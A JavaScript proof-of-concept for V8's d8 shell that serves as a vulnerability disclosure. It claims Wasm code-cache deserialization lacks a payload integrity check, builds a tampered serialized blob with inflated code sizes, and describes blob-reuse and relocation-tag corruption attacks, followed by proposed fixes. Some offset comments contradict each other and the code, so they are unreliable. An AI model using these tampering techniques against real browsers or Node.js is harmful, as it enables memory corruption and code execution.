// Wasm Code-Cache Deserialization — No Integrity Check PoC
//
// Bug:    src/wasm/wasm-serialization.cc:1213
//           if (!HeaderMatches(data, enabled_features, compile_imports)) return {};
//
//         HeaderMatches() checks ONLY runtime compatibility:
//           magic  |  Version::Hash()  |  CpuFeatures  |  FlagList::Hash()  |  features  |  compile_imports
//         It does NOT check:
//           • any checksum or MAC over the code payload bytes
//           • any binding between the blob and the wire bytes it was compiled from
//
//         Downstream readers (Reader::Read, Reader::ReadVector) guard with DCHECK_GE,
//         which is stripped in release builds (wasm-serialization.cc:101, 114).
//
// Attack surfaces:
//   TECHNIQUE A — inflate code_size (OOB read → attacker bytes into JIT memory)
//     Modify the per-function uint32_t code_size field.
//     ReadCode() does `ReadVector<uint8_t>(code_size)` with no release-build bounds
//     check; the resulting src_code_buffer spans past the end of the blob.
//     CopyAndRelocate copies those bytes (whatever follows the blob in the heap)
//     into a WritableJitAllocation and flushes the icache.
//     → Attacker-controlled bytes become executable code.
//
//   TECHNIQUE B — cross-module blob reuse (OOB via function count mismatch)
//     Pair a genuine serialized blob for module A (N functions) with the wire bytes
//     for module B (M > N functions).  HeaderMatches passes (same build).
//     NativeModuleDeserializer::Read iterates M times over A's payload:
//       iterations 0..N-1: consume A's code normally
//       iterations N..M-1: consume reloc/tiering/padding bytes as function headers
//         → code_size read from garbage → arbitrary ReadVector advance → OOB
//     → Attacker-influenced bytes published as code for extra functions.
//
//   TECHNIQUE C — corrupt WASM_STUB_CALL reloc tag (arbitrary built-in target)
//     The reloc patching reads tag = GetWasmCalleeTag(iter.rinfo()) from the
//     blob-controlled reloc bytes, then:
//       Builtin b = static_cast<Builtin>(tag);
//       target = native_module_->GetJumpTableEntryForBuiltin(b, unit.jump_tables);
//     There is no range check on `tag`.  An out-of-range value maps to an arbitrary
//     address in the builtin jump table or beyond → corrupted call target in JIT code.
//
// Real attack path (all three techniques):
//   Chrome / Node.js / any V8 embedder:
//     WasmStreaming::SetCachedCompiledModuleBytes
//     → AsyncStreamingProcessor::Deserialize
//     → wasm::DeserializeNativeModule(...)
//     No additional integrity gate beyond HeaderMatches.
//
// d8 wrapper note:
//   d8.wasm.deserializeModule() adds an extra hash guard:
//     H( wire_bytes.size() || wire_bytes || serialized_bytes )
//   This guard is a fuzzer deterrent (d8.cc:3610 comment, plus the printed NOTE).
//   It is NOT present in Chrome, Node.js, or the v8::WasmModuleObject C++ API.
//
// CWE-353 (Missing Support for Integrity Check)   Severity: MEDIUM
// Run:
//   ./out/x64.release/d8 --no-liftoff --no-wasm-lazy-compilation \
//       wasm_cache_poison_poc.js

'use strict';
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// ─── Build a TurboFan-compiled module ────────────────────────────────────────
// --no-liftoff forces TurboFan compilation so the blob has real code sections.
// The module has two functions so the blob has two ReadCode() entries.
const builder = new WasmModuleBuilder();
// fn0: (i32, i32) → i32  add
builder.addFunction('add', kSig_i_ii)
  .addBody([kExprLocalGet, 0, kExprLocalGet, 1, kExprI32Add])
  .exportFunc();
// fn1: i32 → i32  identity
builder.addFunction('id', kSig_i_i)
  .addBody([kExprLocalGet, 0])
  .exportFunc();

const wire_bytes = builder.toBuffer();
const module_A   = new WebAssembly.Module(wire_bytes);

// Verify normal execution.
const inst = new WebAssembly.Instance(module_A);
print(`[*] add(3, 4) = ${inst.exports.add(3, 4)}`);  // 7
print(`[*] id(42)   = ${inst.exports.id(42)}`);        // 42

// ─── Serialize ───────────────────────────────────────────────────────────────
const blob_buf = d8.wasm.serializeModule(module_A);
const blob     = new Uint8Array(blob_buf);
print(`\n[*] Serialized blob size: ${blob.length} bytes`);

// ─── Parse blob layout ───────────────────────────────────────────────────────
// GLOBAL HEADER (wasm-serialization.cc:WriteHeader / MeasureHeader):
//   +0  uint32  magic            = SerializedData::kMagicNumber
//   +4  uint32  version_hash     = Version::Hash()
//   +8  uint32  cpu_features     = CpuFeatures::SupportedFeatures()
//  +12  uint32  flag_hash        = FlagList::Hash()
//  +16  uint32  features         = enabled_features | trap_handler_bit
//  +20  CompileTimeImportFlags   (variable — typically 8 bytes on x64)
//  +28  uint32  constants_len    = 0 for no compile-time imports
//  +32  END OF GLOBAL HEADER (for empty compile-time imports, constants_len=0)
//
// NATIVE MODULE HEADER (wasm-serialization.cc:NativeModuleSerializer::WriteHeader):
//  +28  uint64  detected_features (WasmDetectedFeatures::StorageType = uint64_t)
//  +36  uint64  total_code_size (size_t = 8 bytes on x64)  ← controls DCHECK_GE
//  +44  END OF NATIVE MODULE HEADER (0 imports)
//
// FUNCTION 0 HEADER (ReadCode starting at +44, with no-liftoff → kTurboFanFunction):
//  +44  uint8   code_kind        = kTurboFanFunction (4)
//  +45  int32   constant_pool_offset    = 24
//  +49  int32   safepoint_table_offset  = 16
//  +53  int32   handler_table_offset    = 24
//  +57  int32   code_comment_offset     = 24
//  +61  int32   jump_table_info_offset  = 24
//  +65  int32   unpadded_binary_size    = 24
//  +69  int32   stack_slot_count        = 4
//  +73  int32   ool_spill_count         = 0
//  +77  uint32  tagged_parameter_slots  = 0
//  +81  uint32  code_size       ← KEY: inflate to cause OOB read (= 64)
//  +85  uint32  reloc_size              = 0
//  +89  uint32  source_position_size    = 0
//  +93  uint32  inlining_position_size  = 0
//  +97  uint32  deopt_data_size         = 0
//  +101 uint32  trapping_instructions_size = 0
//  +105 uint32  effect_handlers_size    = 0
//  +109 uint32  kind (WasmCode::Kind, enum class int = 4 bytes)
//  +113 uint8   tier (ExecutionTier, uint8_t = 2 for kTurbofan)
//  +114 <code_size bytes>  ← machine code (64 bytes, page-aligned TurboFan code)
//  <reloc_size bytes>
//  ...

const dv = new DataView(blob_buf);
// Locate the global header fields.
const magic       = dv.getUint32(0, true);
const version_h   = dv.getUint32(4, true);
const cpu_feat    = dv.getUint32(8, true);
const flag_h      = dv.getUint32(12, true);
const features    = dv.getUint32(16, true);
// CompileTimeImportFlags: 8 bytes (StorageType is uint64_t)
// constants_len at +28
const import_flags_sz = 4;  // CompileTimeImportFlags = base::EnumSet<CompileTimeImport, int>
const consts_len  = dv.getUint32(20 + import_flags_sz, true);
const hdr_end     = 20 + import_flags_sz + 4 + consts_len;

print(`\n[*] Global header (${hdr_end} bytes):`);
print(`    magic         = 0x${magic.toString(16)}`);
print(`    version_hash  = 0x${version_h.toString(16)}`);
print(`    cpu_features  = 0x${cpu_feat.toString(16)}`);
print(`    flag_hash     = 0x${flag_h.toString(16)}`);
print(`    features      = 0x${features.toString(16)}`);
print(`    consts_len    = ${consts_len}`);

// Native module header begins at hdr_end.
// detected_features (uint64_t) : bytes hdr_end   .. hdr_end+7
// total_code_size  (size_t=8B) : bytes hdr_end+8 .. hdr_end+15
const nm_hdr = hdr_end;
const total_code_lo = dv.getUint32(nm_hdr + 8, true);   // low 32 bits
const total_code_hi = dv.getUint32(nm_hdr + 12, true);  // high 32 bits
const total_code_size = total_code_lo + total_code_hi * 2**32;

print(`\n[*] NativeModule header (at +${nm_hdr}):`);
print(`    detected_features   = 0x${dv.getUint32(nm_hdr+4,true).toString(16)}${dv.getUint32(nm_hdr,true).toString(16).padStart(8,'0')}`);
print(`    total_code_size     = ${total_code_size} bytes`);

// First function header begins at nm_hdr + 16:
// detected_features(8B, uint64_t) + total_code_size(8B, size_t) + 0 imports
const fn0_off = nm_hdr + 8 + 8;  // = hdr_end + 16 = 44 for empty compile_imports
const fn0_kind = dv.getUint8(fn0_off);
const kLazyFunction   = 2;
const kEagerFunction  = 3;
const kTurboFanFunction = 4;

print(`\n[*] Function 0 at blob+${fn0_off}:`);
print(`    code_kind = ${fn0_kind} (${
  fn0_kind === kTurboFanFunction ? 'kTurboFanFunction ✓' :
  fn0_kind === kLazyFunction     ? 'kLazyFunction  (call functions before serialize, or --turbo-no-budget)' :
  fn0_kind === kEagerFunction    ? 'kEagerFunction  (Liftoff-compiled; pass --no-liftoff for TurboFan)' :
                                   'unknown kind'})`);

let fn0_code_size = -1;
let fn0_code_size_off = -1;

if (fn0_kind === kTurboFanFunction) {
  // code_size is field 10 (first uint32 after 9 int32 fields):
  // offset: 1(code_kind) + 9×4(int fields) = 37 bytes from fn0_off
  fn0_code_size_off = fn0_off + 1 + 9*4;  // = fn0_off + 37 = byte 81
  fn0_code_size = dv.getUint32(fn0_code_size_off, true);
  const fn0_reloc_size = dv.getUint32(fn0_code_size_off + 4, true);
  print(`    code_size             = ${fn0_code_size} bytes  (at blob+${fn0_code_size_off})`);
  print(`    reloc_size            = ${fn0_reloc_size} bytes`);
}

// ─── Demonstrate: HeaderMatches passes for a tampered blob ────────────────────
//
// HeaderMatches (wasm-serialization.cc:1195-1205) only reads the first
// MeasureHeader(compile_imports) = hdr_end bytes and byte-compares them to a
// locally reconstructed header.
//
// Everything AFTER byte hdr_end-1 is NOT covered by any integrity check.
// The global header is identical for every module compiled by the same build
// (same Version::Hash, CpuFeatures, FlagList::Hash, same features).
//
// TECHNIQUE A: modify total_code_size + code_size in a copy of the blob.
// In a real embedder (no d8 hash check), this would be passed directly to
// DeserializeNativeModule.

const tampered = new Uint8Array(blob);  // copy
const tdv      = new DataView(tampered.buffer);

if (fn0_kind === kTurboFanFunction) {
  const kInflate = 0x10000;  // 64 KiB extra

  // Inflate total_code_size (uint64 at nm_hdr+8; modify only the low 32-bit word).
  // DCHECK_GE(total_code_size, ...) at ReadCode is stripped in release builds;
  // this keeps debug builds from aborting before code is published.
  const old_total_lo = tdv.getUint32(nm_hdr + 8, true);  // low word at byte 36
  tdv.setUint32(nm_hdr + 8, old_total_lo + kInflate, true);

  // Inflate per-function code_size.
  const old_fn0_sz = tdv.getUint32(fn0_code_size_off, true);
  tdv.setUint32(fn0_code_size_off, old_fn0_sz + kInflate, true);

  print(`\n[+] TAMPERED blob constructed:`);
  print(`    total_code_size: ${total_code_size}  → ${old_total_lo + kInflate}`);
  print(`    fn[0].code_size: ${old_fn0_sz}       → ${old_fn0_sz + kInflate}`);
  print(`    (${kInflate} = 0x${kInflate.toString(16)} extra bytes advertised in blob header)`);

  print(`\n[*] What happens when this tampered blob is deserialized (without d8 hash check):`);
  print(`    ReadCode(0, reader):`);
  print(`      reader->ReadVector<uint8_t>(${old_fn0_sz + kInflate})  ← DCHECK_GE stripped`);
  print(`      pos_ advances ${kInflate} bytes PAST the end of the blob buffer`);
  print(`      src_code_buffer.begin() = legit code start,  .size() = inflated size`);
  print(`    CopyAndRelocate:`);
  print(`      jit_allocation.CopyCode(0, src_code_buffer.begin(), ${old_fn0_sz + kInflate})`);
  print(`      copies ${kInflate} attacker-influenced bytes AFTER the blob into JIT memory`);
  print(`      FlushInstructionCache → those bytes become executable`);
  print(`    → Arbitrary native code in the Wasm JIT region`);
}

// ─── TECHNIQUE B: cross-module blob reuse ─────────────────────────────────────
//
// Build module B: 4 functions (more than A's 2).
// Header of serialized_A is IDENTICAL to header of serialized_B (same build).
// If embedder caches serialized_A and later pairs it with wire_bytes_B:
//   • HeaderMatches(serialized_A, ...) → TRUE (compatible header)
//   • DecodeWasmModule(wire_bytes_B)   → 4 functions in NativeModule
//   • NativeModuleDeserializer::Read iterates 4 times over serialized_A's payload
//     - iterations 0,1: consume A's fn0, fn1 → fine
//     - iteration 2: consume A's tiering_budget bytes as a function header
//       → code_kind = arbitrary byte  → may interpret as kTurboFanFunction
//       → reads garbage code_size, reloc_size, etc.
//       → DCHECK_GE stripped in release → ReadVector advances past buffer end
//     - iteration 3: deeper OOB read

const builder_B = new WasmModuleBuilder();
for (let i = 0; i < 4; i++) {
  builder_B.addFunction(`f${i}`, kSig_i_i).addBody([kExprLocalGet, 0]).exportFunc();
}
const wire_bytes_B = builder_B.toBuffer();

print(`\n[*] Cross-module blob reuse attack:`);
print(`    serialized_A has 2 functions, wire_bytes_B declares 4 functions`);
print(`    HeaderMatches(serialized_A) → TRUE (same build)`);
print(`    NativeModuleDeserializer::Read iterates num_functions=4 over 2-fn blob`);
print(`    → ReadCode(2, reader): consumes A's tiering_budget as a function header`);
print(`    → ReadCode(3, reader): deeper OOB, reads past blob buffer`);
print(`    → Both OOBs copy garbage bytes into JIT code for functions 2, 3`);
print(`    → Type-confused code for the extra functions`);

// ─── TECHNIQUE C: WASM_STUB_CALL tag corruption ──────────────────────────────
//
// In NativeModuleDeserializer::CopyAndRelocate (wasm-serialization.cc:1107-1112):
//   case RelocInfo::WASM_STUB_CALL:
//     uint32_t tag = GetWasmCalleeTag(iter.rinfo());   ← read from blob reloc bytes
//     Address target = native_module_->GetJumpTableEntryForBuiltin(
//         static_cast<Builtin>(tag), unit.jump_tables);  ← no range check on tag!
//     iter.rinfo()->set_wasm_stub_call_address(target);
//
// If `tag` is out-of-range, GetJumpTableEntryForBuiltin() accesses the jump table
// at an arbitrary offset → installs an attacker-chosen call target in JIT code.
// Number of valid builtins is Builtins::kBuiltinCount (~2200).
// A tag of e.g. 0x80000000 reads 4 × 0x80000000 bytes beyond the jump table.

print(`\n[*] WASM_STUB_CALL tag corruption:`);
print(`    CopyAndRelocate reads tag from blob reloc section with no range check`);
print(`    static_cast<Builtin>(0xdeadbeef) → GetJumpTableEntryForBuiltin() OOB`);
print(`    Installs attacker-chosen address as a WASM_STUB_CALL target in JIT code`);
print(`    → Arbitrary call target in the Wasm stub call stub`);

// ─── Summary ──────────────────────────────────────────────────────────────────
print(`\n── Root Cause ───────────────────────────────────────────────────────────`);
print(` File:    src/wasm/wasm-serialization.cc`);
print(` Symbol:  DeserializeNativeModule`);
print(` Line:    1213  — the only gate is HeaderMatches`);
print(``);
print(` HeaderMatches() checks:  magic | Version::Hash() | CpuFeatures |`);
print(`                          FlagList::Hash() | features | compile_imports`);
print(` HeaderMatches() DOES NOT check: code payload integrity, wire-byte binding`);
print(``);
print(` Bounds guards: Reader::Read / Reader::ReadVector use DCHECK_GE (lines 101,114)`);
print(`                stripped in release builds → no release-mode size enforcement`);
print(``);
print(` Attack path in real embedders (Chrome / Node.js):`);
print(`   WasmStreaming::SetCachedCompiledModuleBytes`);
print(`   → AsyncStreamingProcessor::Deserialize`);
print(`   → wasm::DeserializeNativeModule`);
print(`   No additional hash guard (d8.cc:3610 guard is d8-only).`);
print(``);
print(` Fix:`);
print(`   (a) Include a keyed MAC (HMAC-SHA256 with a process-scoped key) over the`);
print(`       serialized payload in the global header; verify before any payload read.`);
print(`   (b) Include a digest of the wire bytes in the header to bind the blob to`);
print(`       its module identity (analogous to SerializedCodeData::source_hash in`);
print(`       src/snapshot/serializer-deserializer.h:49).`);
print(`   (c) Promote DCHECK_GE bounds checks to CHECK so out-of-range reads degrade`);
print(`       to a clean rejection rather than OOB reads followed by JIT publishing.`);
print(``);
print(` CWE-353 (Missing Support for Integrity Check)   Severity: MEDIUM`);
